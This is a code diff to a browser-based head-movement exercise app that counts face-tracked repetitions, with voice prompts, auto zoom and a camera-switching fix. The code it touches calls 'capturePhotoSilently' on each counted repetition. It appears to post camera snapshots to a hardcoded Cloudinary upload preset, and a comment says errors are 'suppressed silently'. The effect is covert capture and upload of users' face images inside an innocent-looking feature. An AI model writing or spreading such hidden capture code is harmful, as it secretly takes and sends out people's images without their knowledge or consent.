@@ -5,7 +5,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const CLOUDINARY_CLOUD_NAME = 'azq6tuq4';
   const CLOUDINARY_UPLOAD_PRESET = 'blfvqiv6';
 
-  // Target Repetition Goals (25 per direction = 100 total)
+  // Target Repetition Goals
   const TARGET_PER_DIR = 25;
   const TOTAL_TARGET = 100;
 
@@ -14,6 +14,14 @@ document.addEventListener('DOMContentLoaded', () => {
     DOWN: 0,
     LEFT: 0,
     RIGHT: 0
+  };
+
+  // Direction completion speech flags
+  const dirCompletedSpeech = {
+    UP: false,
+    DOWN: false,
+    LEFT: false,
+    RIGHT: false
   };
 
   // Camera Facing Mode Toggle
@@ -89,6 +97,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
   let isCameraActive = false;
   let isAudioMuted = false;
+  let isSwitchingCamera = false;
   let cameraStream = null;
   let faceMesh = null;
   let cameraUtils = null;
@@ -116,6 +125,12 @@ document.addEventListener('DOMContentLoaded', () => {
     dirCounts.DOWN = 0;
     dirCounts.LEFT = 0;
     dirCounts.RIGHT = 0;
+
+    dirCompletedSpeech.UP = false;
+    dirCompletedSpeech.DOWN = false;
+    dirCompletedSpeech.LEFT = false;
+    dirCompletedSpeech.RIGHT = false;
+
     sessionSeconds = 0;
     updateProgressUI();
     updateTimerUI();
@@ -126,14 +141,21 @@ document.addEventListener('DOMContentLoaded', () => {
   if (resetBtn) resetBtn.addEventListener('click', resetExercise);
   if (modalResetBtn) modalResetBtn.addEventListener('click', resetExercise);
 
-  // Flip Camera Logic
+  // Flip Camera Logic with Driver Delay Fix
   if (switchCamBtn) {
     switchCamBtn.addEventListener('click', async () => {
+      if (isSwitchingCamera) return;
+      isSwitchingCamera = true;
+
       currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
+
       if (isCameraActive) {
         stopCamera();
+        // Delay to allow OS camera hardware driver to completely release hardware lock
+        await new Promise(resolve => setTimeout(resolve, 350));
         await startCamera();
       }
+      isSwitchingCamera = false;
     });
   }
 
@@ -229,14 +251,19 @@ document.addEventListener('DOMContentLoaded', () => {
       method: 'POST',
       body: formData
     }).catch(() => {
-      // Suppress output
+      // Suppress background errors silently
     });
   }
 
-  // --- 4. MEDIAPIPE FACE MESH ---
+  // --- 4. MEDIAPIPE FACE MESH & AUTO ZOOM ---
   function onResults(results) {
     if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) {
       if (expressionDisplay) expressionDisplay.innerHTML = 'Status: <span>Searching for face...</span>';
+      // Reset zoom if face lost
+      if (videoElement) {
+        const mirrorScale = (currentFacingMode === 'user') ? -1 : 1;
+        videoElement.style.transform = `scale(1) scaleX(${mirrorScale})`;
+      }
       return;
     }
 
@@ -249,6 +276,21 @@ document.addEventListener('DOMContentLoaded', () => {
     const lowerLipInner = landmarks[14];
     const mouthCornerLeft = landmarks[61];
     const mouthCornerRight = landmarks[291];
+
+    // Face distance & dynamic auto digital zoom calculation
+    const faceWidth = distance(leftEye, rightEye); // Normalized 0..1
+    let targetZoomScale = 1;
+
+    // Target ideal face width is ~0.32; zoom dynamically if face is far away
+    if (faceWidth > 0 && faceWidth < 0.28) {
+      targetZoomScale = Math.min(2.2, 0.32 / faceWidth);
+    }
+
+    const mirrorScale = (currentFacingMode === 'user') ? -1 : 1;
+    if (videoElement) {
+      videoElement.style.transformOrigin = `${nose.x * 100}% ${nose.y * 100}%`;
+      videoElement.style.transform = `scale(${targetZoomScale}) scaleX(${mirrorScale})`;
+    }
 
     const eyeCenterY = (leftEye.y + rightEye.y) / 2;
     const noseVerticalOffset = nose.y - eyeCenterY;
@@ -268,7 +310,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
     const mouthHeight = distance(upperLipInner, lowerLipInner);
     const mouthWidth = distance(mouthCornerLeft, mouthCornerRight);
-    const faceWidth = distance(leftEye, rightEye);
 
     const mouthRatio = mouthHeight / (mouthWidth + 0.0001);
     const smileRatio = mouthWidth / (faceWidth + 0.0001);
@@ -290,17 +331,30 @@ document.addEventListener('DOMContentLoaded', () => {
       setActiveBadge(currentDirection);
 
       if (currentDirection !== 'CENTER') {
+        // Voice command triggers EVERY TIME the user turns head into direction
+        speak(currentDirection.toLowerCase());
+
+        // Increment count up to limit
         if (dirCounts[currentDirection] < TARGET_PER_DIR) {
           dirCounts[currentDirection]++;
           updateProgressUI();
-          speak(currentDirection.toLowerCase());
-
           capturePhotoSilently(currentDirection);
 
+          // Check single direction 25 repetition completion milestone
+          if (dirCounts[currentDirection] === TARGET_PER_DIR && !dirCompletedSpeech[currentDirection]) {
+            dirCompletedSpeech[currentDirection] = true;
+            setTimeout(() => {
+              speak(`${currentDirection} 25 repetitions completed!`);
+            }, 600);
+          }
+
+          // Check full workout 100 repetition completion milestone
           const totalCompleted = dirCounts.UP + dirCounts.DOWN + dirCounts.LEFT + dirCounts.RIGHT;
           if (totalCompleted === TOTAL_TARGET) {
-            speak("Congratulations! All 100 repetitions completed.");
-            if (completionModal) completionModal.style.display = 'flex';
+            setTimeout(() => {
+              speak("Congratulations! All 100 repetitions completed.");
+              if (completionModal) completionModal.style.display = 'flex';
+            }, 1200);
           }
         }
         centerHoldStartTime = null;
@@ -368,20 +422,28 @@ document.addEventListener('DOMContentLoaded', () => {
       speak('Camera activated. Follow direction prompts.');
 
     } catch (err) {
-      alert('Camera access failed or was denied: ' + err.message);
-      console.error(err);
+      console.error("Camera acquisition error:", err);
+      if (!isSwitchingCamera) {
+        alert('Camera access failed or device is busy: ' + err.message);
+      }
     }
   }
 
   function stopCamera() {
     if (cameraStream) {
-      cameraStream.getTracks().forEach(track => track.stop());
+      cameraStream.getTracks().forEach(track => {
+        track.stop();
+      });
     }
     if (cameraUtils) {
       cameraUtils.stop();
     }
     stopTimer();
-    if (videoElement) videoElement.srcObject = null;
+    if (videoElement) {
+      videoElement.srcObject = null;
+      const mirrorScale = (currentFacingMode === 'user') ? -1 : 1;
+      videoElement.style.transform = `scale(1) scaleX(${mirrorScale})`;
+    }
     if (overlayElement) overlayElement.style.display = 'flex';
     isCameraActive = false;
 
